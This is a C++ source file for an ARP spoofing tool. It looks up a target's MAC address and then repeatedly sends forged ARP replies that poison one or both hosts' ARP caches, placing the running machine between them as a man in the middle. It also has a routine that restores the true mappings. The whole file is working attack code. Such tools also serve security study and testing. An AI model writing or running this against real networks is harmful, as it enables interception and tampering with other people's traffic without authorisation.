#include "ARPSpoofer.h"

#include <iostream>
#include <cstring>
#include <poll.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <arpa/inet.h> 
#include <sys/ioctl.h> 

ARPSpoof::ARPSpoofer::ARPSpoofer()
{

}

ARPSpoof::ARPSpoofer::~ARPSpoofer()
{

}

int ARPSpoof::ARPSpoofer::GetTargetMACAddr(const int socketFd, const char* interfaceName, const char* srcIPStr, const char* srcMACStr, 
    const char* targetIPStr, char* targetMACStr)
{
    while (PacketCraft::GetARPTableMACAddr(socketFd, interfaceName, targetIPStr, targetMACStr) == APPLICATION_ERROR)
    {
        std::cout << "Could not find target in the ARP table. Sending ARP request...\n";

        PacketCraft::ARPPacket arpPacket;
        if(arpPacket.Create(srcMACStr, "ff:ff:ff:ff:ff:ff", srcIPStr, targetIPStr, ARPType::ARP_REQUEST) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "PacketCraft::ARPPacket::Create() error!");
            return APPLICATION_ERROR;
        }

        if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "PacketCraft::ARPPacket::Send() error!");
            return APPLICATION_ERROR;
        }

        if(arpPacket.Receive(socketFd, 0, ARP_REQ_TIMEOUT_MS) == NO_ERROR)
        {
            sockaddr_in ipAddr{};
            ipAddr.sin_family = AF_INET;
            memcpy(&ipAddr.sin_addr.s_addr, arpPacket.arpHeader->ar_sip, IPV4_ALEN);

            if(PacketCraft::AddAddrToARPTable(socketFd, interfaceName, ipAddr, *(ether_addr*)arpPacket.arpHeader->ar_sha) == APPLICATION_ERROR)
            {
                LOG_ERROR(APPLICATION_ERROR, "Failed to add MAC address into the ARP table\n");
                return APPLICATION_ERROR;
            }
        }
        else
        {
            std::cout << "Could not get target MAC address." << std::endl;
            return APPLICATION_ERROR;
        }
    }

    return NO_ERROR;
}

int ARPSpoof::ARPSpoofer::Spoof(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    PacketCraft::ARPPacket arpPacket;
    if(arpPacket.Create(yourMAC, target1MACStr, target2IPStr, target1IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
        return APPLICATION_ERROR;
    }

    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
        return APPLICATION_ERROR;
    }

    std::cout << "sending ARP packet to " << target1MACStr << " (" << target1IPStr << "): " << yourMAC 
    << " is at " << target2IPStr << " (press enter key to stop)" << "\n";

    if(spoofBoth == TRUE)
    {
        if(arpPacket.Create(yourMAC, target2MACStr, target1IPStr, target2IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
            return APPLICATION_ERROR;
        }

        if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
            return APPLICATION_ERROR;
        }

        std::cout 
            << "sending ARP packet to " << target2MACStr << " (" << target2IPStr << "): " << yourMAC 
            << " is at " << target1IPStr << " (press enter key to stop)" << "\n";
    }

    return NO_ERROR;
}

int ARPSpoof::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    pollfd pollFds[1]{};
    pollFds[0].fd = 0;      
    pollFds[0].events = POLLIN;

    std::cout << "\nSpoofing...press enter to stop\n\n";

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), ARP_SPOOF_FREQUENCY_MS);
        if(nEvents == -1)
        {
            LOG_ERROR(APPLICATION_ERROR, "poll() error!");
            return APPLICATION_ERROR;
        }
        else if(nEvents == 0)
        {
            if(Spoof(socketFd, interfaceName, yourIP, yourMAC, target1IPStr, target1MACStr, target2IPStr, target2MACStr, spoofBoth) == APPLICATION_ERROR)
            {
                LOG_ERROR(APPLICATION_ERROR, "Spoof() error!");
                return APPLICATION_ERROR;
            }
        }
        else
        {
            if(pollFds[0].revents & POLLIN)
            {
                std::cout << "stopping..." << std::endl;
                break;
            }
        }
    }

    return NO_ERROR;
}

int ARPSpoof::ARPSpoofer::RestoreTargets(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    PacketCraft::ARPPacket arpPacket;
    if(arpPacket.Create(target2MACStr, target1MACStr, target2IPStr, target1IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
        return APPLICATION_ERROR;
    }

    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
        return APPLICATION_ERROR;
    }

    if(spoofBoth == TRUE)
    {
        if(arpPacket.Create(target1MACStr, target2MACStr, target1IPStr, target2IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
            return APPLICATION_ERROR;
        }

        if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
            return APPLICATION_ERROR;
        }
    }

    return NO_ERROR;
}

